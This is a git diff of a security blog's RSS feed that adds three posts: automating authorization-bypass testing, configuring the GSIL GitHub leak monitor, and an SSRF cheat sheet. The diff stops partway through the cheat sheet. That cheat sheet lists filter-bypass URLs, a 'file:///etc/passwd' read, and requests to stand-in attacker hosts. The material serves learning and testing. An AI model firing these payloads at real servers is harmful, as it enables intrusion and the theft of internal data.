@@ -3,11 +3,689 @@
   <channel>
     <title>3ecurity</title>
     <description></description>
-    <link>http://localhost:4000//</link>
-    <atom:link href="http://localhost:4000//feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Tue, 16 Apr 2019 09:12:44 +0800</pubDate>
-    <lastBuildDate>Tue, 16 Apr 2019 09:12:44 +0800</lastBuildDate>
+    <link>http://0.0.0.0:80//</link>
+    <atom:link href="http://0.0.0.0:80//feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Wed, 08 May 2019 10:21:16 +0800</pubDate>
+    <lastBuildDate>Wed, 08 May 2019 10:21:16 +0800</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>Web安全-越权自动化工具</title>
+        <description>&lt;blockquote&gt;
+  &lt;p&gt;此篇博文主要描述的是关于自建扫描器实现越权访问检测的思考🤔&lt;/p&gt;
+  &lt;h4 id=&quot;关于越权&quot;&gt;关于越权&lt;/h4&gt;
+  &lt;p&gt;以前接触到的一些扫描器，大多都是针对SQL注入、XSS这类攻击进行扫描。虽然扫描器可以实现登录扫描，但是仅限于一个帐号登录。做不到2个帐号登录，或者是一个帐号登录，然后通过修改帐号标示来判断是否存在越权。&lt;/p&gt;
+  &lt;h4 id=&quot;实现思路&quot;&gt;实现思路&lt;/h4&gt;
+  &lt;p&gt;自动化工具简而言之就是模拟人工进行重复性的操作，那我们想一下，如果是手工检测越权，我们需要如何去操作?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;h5 id=&quot;情况一&quot;&gt;情况一&lt;/h5&gt;
+  &lt;p&gt;通过替换cookie的值来测试越权。&lt;/p&gt;
+  &lt;blockquote&gt;
+    &lt;h6 id=&quot;步骤一&quot;&gt;步骤一&lt;/h6&gt;
+    &lt;blockquote&gt;
+      &lt;p&gt;首先正常登录用户A、记录A用户所有的功能菜单，接着登录用户B、记录B用户所有的功能菜单。&lt;/p&gt;
+      &lt;h6 id=&quot;步骤二&quot;&gt;步骤二&lt;/h6&gt;
+      &lt;p&gt;接着对比两个用户中交叉范围外的菜单，例如A帐号的菜单为1，2，3，4，5。B帐号的菜单为2，3，4，5。那么，我们只需要用B帐号的cookie去访问A菜单中1功能的url。如果可以成功访问，那么就说明是存在越权问题的。&lt;/p&gt;
+    &lt;/blockquote&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;h5 id=&quot;情况二&quot;&gt;情况二&lt;/h5&gt;
+  &lt;p&gt;通过替换URL参数来测试越权。。&lt;/p&gt;
+  &lt;blockquote&gt;
+    &lt;h6 id=&quot;步骤一-1&quot;&gt;步骤一&lt;/h6&gt;
+    &lt;blockquote&gt;
+      &lt;p&gt;首先正常登录用户A、记录A用户访问某些URL时候参数值，以及返回的数据报文。接着登录用户B、记录B用户访问某些URL时候的参数值，以及返回的数据报文。&lt;/p&gt;
+      &lt;h6 id=&quot;步骤二-1&quot;&gt;步骤二&lt;/h6&gt;
+      &lt;p&gt;接着将A用户访问的参数值替换为B用户访问的参数值，对比当前返回的数据报文。如果和步骤一中A返回数据报文相同，则说明不存在越权问题。如果和步骤一中B用户返回的数据报文相同，则说明存在越权问题。&lt;/p&gt;
+    &lt;/blockquote&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+</description>
+        <pubDate>Sun, 28 Apr 2019 04:10:00 +0800</pubDate>
+        <link>http://0.0.0.0:80//blog/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E8%B6%8A%E6%9D%83%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7/</link>
+        <guid isPermaLink="true">http://0.0.0.0:80//blog/Web%E5%AE%89%E5%85%A8%E4%B9%8B%E8%B6%8A%E6%9D%83%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7/</guid>
+        
+        <category>Web安全</category>
+        
+        <category>越权自动化</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>GSIL配置使用--GitHub敏感信息泄露监控</title>
+        <description>&lt;blockquote&gt;
+  &lt;p&gt;近实时监控GitHub敏感信息泄露，并发送告警通知。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;安装&quot;&gt;安装&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;仅在Python3下验证过&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/FeeiCN/gsil.git
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;gsil/
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pip &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; requirements.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;配置&quot;&gt;配置&lt;/h2&gt;
+
+&lt;h3 id=&quot;gsilconfiggsil重命名自configgsilexample-告警邮箱和github配置&quot;&gt;gsil/config.gsil(重命名自config.gsil.example): 告警邮箱和Github配置&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[mail]
+host : smtp.exmail.qq.com
+# SMTP端口(非SSL端口，但会使用TLS加密)
+port : 25
+# 多个发件人使用逗号(,)分隔
+mails : gsil@feei.cn
+from : GSIL
+password : your_password
+# 多个收件人使用逗号(,)分隔
+to : feei@feei.cn
+
+[github]
+# 扫描到的漏洞仓库是否立刻Clone到本地（~/.gsil/codes/）
+# 此选项用作监控其它厂商，避免因为仓库所有者发现后被删除
+clone: false
+
+# GitHub Token用来调用相关API，多个Token使用逗号(,)分隔
+# https://github.com/settings/tokens
+tokens : your_token
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;gsilrulesgsil重命名自rulesgsilexample-扫描规则&quot;&gt;gsil/rules.gsil(重命名自rules.gsil.example): 扫描规则&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;规则一般选用内网独立的特征，比如蘑菇街的外网是mogujie.com，蘑菇街的内网是mogujie.org，则可以将mogujie.org作为一条规则。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;其它还有类似代码头部特征、外部邮箱特征等&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;字段&lt;/td&gt;
+      &lt;td&gt;意义&lt;/td&gt;
+      &lt;td&gt;选填&lt;/td&gt;
+      &lt;td&gt;默认&lt;/td&gt;
+      &lt;td&gt;描述&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;keyword&lt;/td&gt;
+      &lt;td&gt;关键词&lt;/td&gt;
+      &lt;td&gt;必填&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;多个关键词可以用空格，比如‘账号 密码’；某些关键字出现的结果非常多，所以需要精确搜索时可以用双引号括起来，比如‘”ele.me“’；&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ext&lt;/td&gt;
+      &lt;td&gt;指定文件后缀&lt;/td&gt;
+      &lt;td&gt;可选&lt;/td&gt;
+      &lt;td&gt;全部后缀&lt;/td&gt;
+      &lt;td&gt;多个后缀可以使用英文半角逗号（,）分隔，比如&lt;code class=&quot;highlighter-rouge&quot;&gt;java,php,python&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;mode&lt;/td&gt;
+      &lt;td&gt;匹配模式&lt;/td&gt;
+      &lt;td&gt;可选&lt;/td&gt;
+      &lt;td&gt;正常匹配(normal-match)&lt;/td&gt;
+      &lt;td&gt;正常匹配(normal-match)：匹配包含keyword的行，并记录该行附近行 / 仅匹配(only-match)：仅匹配包含keyword行 / 全部匹配(full-match)（不推荐使用）：搜出来的整个问题都算作结果&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
+    # 一级分类，一般使用公司名，用作开启扫描的第一个参数（python gsil.py test）
+    &quot;test&quot;: {
+        # 二级分类，一般使用产品线
+        &quot;mogujie&quot;: {
+            # 公司内部域名
+            &quot;\&quot;mogujie.org\&quot;&quot;: {
+                # mode/ext默认可不填
+                &quot;mode&quot;: &quot;normal-match&quot;,
+                &quot;ext&quot;: &quot;php,java,python,go,js,properties&quot;
+            },
+            # 公司代码特征
+            &quot;copyright meili inc&quot;: {},
+            # 内部主机域名
+            &quot;yewu1.db.mogujie.host&quot;: {},
+            # 外部邮箱
+            &quot;mail.mogujie.com&quot;: {}
+        },
+        &quot;meilishuo&quot;: {
+            &quot;meilishuo.org&quot;: {},
+            &quot;meilishuo.io&quot;: {}
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;用法&quot;&gt;用法&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 启动测试&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python gsil.py &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 测试token有效性&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python gsil.py &lt;span class=&quot;nt&quot;&gt;--verify-tokens&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;crontab &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 漏洞报告，此项任务发现漏洞后会立刻发送漏洞报告&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# 每个小时运行一次，GitHub API接口调用频率限制可以根据token数量、规则数量来调整crontab频率实现，若觉得麻烦可简单配置多个token来实现。&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# crontab执行时间决定了报告的发送时效性，间隔越短报告越快但频率限制越容易触发&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# 建议配置5个token+20条规则，每15分钟运行一次（可以配置更短，根据各自需求确定）&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/15 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /usr/bin/python /var/app/gsil/gsil.py &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/gsil
+
+&lt;span class=&quot;c&quot;&gt;# 统计报告，发送一天的扫描进展，包括运行次数、成功次数、失败次数、发现漏洞数、各域名状况、异常等等&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# 每天晚上11点发送统计报告&lt;/span&gt;
+0 23 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /usr/bin/python /var/app/gsil/gsil.py &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;扫描报告过一次的将不会重复报告，缓存记录在~/.gsil/目录&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;引用&quot;&gt;引用&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://feei.cn/gsil&quot;&gt;GSIL详细介绍&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+        <pubDate>Wed, 24 Apr 2019 19:00:00 +0800</pubDate>
+        <link>http://0.0.0.0:80//blog/GSIL%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8/</link>
+        <guid isPermaLink="true">http://0.0.0.0:80//blog/GSIL%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8/</guid>
+        
+        <category>GSIL</category>
+        
+        <category>GitHub监控</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>SSRF Injection </title>
+        <description>&lt;h1 id=&quot;server-side-request-forgery&quot;&gt;Server-Side Request Forgery&lt;/h1&gt;
+
+&lt;p&gt;Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.&lt;/p&gt;
+
+&lt;p&gt;Tools:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/swisskyrepo/SSRFmap&quot;&gt;SSRFmap - https://github.com/swisskyrepo/SSRFmap&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/tarunkant/Gopherus&quot;&gt;Gopherus - https://github.com/tarunkant/Gopherus&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#exploit-with-localhost&quot;&gt;Exploit with localhost&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#bypassing-filters&quot;&gt;Bypassing filters&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#ssrf-via-url-scheme&quot;&gt;SSRF via URL Scheme&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#ssrf-to-xss-by-d0rkerdevil--alyssaoherrera&quot;&gt;SSRF to XSS&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#ssrf-url-for-cloud-instances&quot;&gt;SSRF URL for Cloud Instances&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssrf-url-for-aws-bucket&quot;&gt;SSRF URL for AWS Bucket&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssrf-url-for-google-cloud&quot;&gt;SSRF URL for Google Cloud&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssrf-url-for-digital-ocean&quot;&gt;SSRF URL for Digital Ocean&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssrf-url-for-packetcloud&quot;&gt;SSRF URL for Packetcloud&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssrf-url-for-azure&quot;&gt;SSRF URL for Azure&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssrf-url-for-openstackrackspace&quot;&gt;SSRF URL for OpenStack/RackSpace&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssrf-url-for-hp-helion&quot;&gt;SSRF URL for HP Helion&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssrf-url-for-oracle-cloud&quot;&gt;SSRF URL for Oracle Cloud&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssrf-url-for-kubernetes-etcd&quot;&gt;SSRF URL for Kubernetes ETCD&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssrf-url-for-alibaba&quot;&gt;SSRF URL for Alibaba&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssrf-url-for-docker&quot;&gt;SSRF URL for Docker&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssrf-url-for-rancher&quot;&gt;SSRF URL for Rancher&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;exploit-with-localhost&quot;&gt;Exploit with localhost&lt;/h2&gt;
+
+&lt;p&gt;Basic SSRF v1&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://0.0.0.0:80
+http://0.0.0.0:443
+http://0.0.0.0:22
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Basic SSRF - Alternative version&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://localhost:80
+http://localhost:443
+http://localhost:22
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Advanced exploit using a redirection&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
+2. Launch the SSRF: vulnerable.com/index.php?url&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://YOUR_SERVER_IP
+vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Advanced exploit using type=url&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Change &lt;span class=&quot;s2&quot;&gt;&quot;type=file&quot;&lt;/span&gt; to &lt;span class=&quot;s2&quot;&gt;&quot;type=url&quot;&lt;/span&gt;
+Paste URL &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;text field and hit enter
+&lt;span class=&quot;k&quot;&gt;Using &lt;/span&gt;this vulnerability &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;can upload images &lt;span class=&quot;k&quot;&gt;from &lt;/span&gt;any image URL &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; trigger an SSRF
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;bypassing-filters&quot;&gt;Bypassing filters&lt;/h2&gt;
+
+&lt;p&gt;Bypass using HTTPS&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://127.0.0.1/
+https://localhost/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bypass localhost with [::]&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://[::]:80/
+http://[::]:25/ SMTP
+http://[::]:22/ SSH
+http://[::]:3128/ Squid
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://0000::1:80/
+http://0000::1:25/ SMTP
+http://0000::1:22/ SSH
+http://0000::1:3128/ Squid
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bypass localhost with a domain redirecting to locahost&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://localtest.me
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+http://mail.ebc.apple.com redirect to 127.0.0.6 &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; localhost
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The service nip.io is awesome for that, it will convert any ip address as a dns.&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NIP.IO maps &amp;lt;anything&amp;gt;.&amp;lt;IP Address&amp;gt;.nip.io to the corresponding &amp;lt;IP Address&amp;gt;, even 127.0.0.1.nip.io maps to 127.0.0.1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bypass localhost with CIDR : 127.x.x.x&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;it&lt;span class=&quot;s1&quot;&gt;'s a /8
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bypass using a decimal ip location&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://0177.0.0.1/
+http://2130706433/ &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; http://127.0.0.1
+http://3232235521/ &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; http://192.168.0.1
+http://3232235777/ &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; http://192.168.1.1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bypass using malformed urls&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;localhost:+11211aaa
+localhost:00011211aaaa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bypass using rare address&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://0/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bypass using bash variables (curl only)&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;curl&lt;/span&gt; -v &lt;span class=&quot;s2&quot;&gt;&quot;http://evil&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$google&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.com&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$google&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bypass using tricks combination&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://1.1.1.1 &amp;amp;@2.2.2.2# @3.3.3.3/
+urllib2 : 1.1.1.1
+requests + browsers : 2.2.2.2
+urllib : 3.3.3.3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bypass using enclosed alphanumerics &lt;a href=&quot;https://twitter.com/EdOverflow&quot;&gt;@EdOverflow&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; example.com
+
+List:
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bypass against a weak parser - by Orange Tsai (&lt;a href=&quot;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&quot;&gt;Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&lt;/a&gt;)&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2019/SSRF_Parser.png&quot; alt=&quot;SSRF_Parser.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;ssrf-via-url-scheme&quot;&gt;SSRF via URL Scheme&lt;/h2&gt;
+
+&lt;p&gt;File Wrapper&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file:///etc/passwd
+file://\/\/etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dict Wrapper
+The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dict://&amp;lt;user&amp;gt;;&amp;lt;auth&amp;gt;@&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/d:&amp;lt;word&amp;gt;:&amp;lt;database&amp;gt;:&amp;lt;n&amp;gt;
+ssrf.php?url&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dict://attacker:11111/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Sftp Wrapper&lt;/p&gt;
+
